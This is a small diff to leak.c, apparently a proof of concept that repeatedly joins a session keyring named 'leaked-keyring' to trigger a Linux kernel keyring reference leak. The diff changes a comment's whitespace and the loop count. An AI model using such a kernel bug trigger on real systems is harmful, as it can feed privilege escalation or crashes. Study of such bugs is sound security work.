@@ -3,7 +3,7 @@
     if ubuntu: install libkeyutils-dev
     $ gcc leak.c -o leak -lkeyutils -Wall
     $ ./leak 
-    $ cat /proc/keys 
+    $ cat /proc/keys  
 */
 
 #include <stddef.h>
@@ -26,7 +26,7 @@ int main(int argc, const char *argv[]){
         return -1;
     }
 
-    for (i = 0; i < 69; i++) {
+    for (i = 0; i < 42; i++) {
         serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
         if (serial < 0) {
             perror("keyctl");
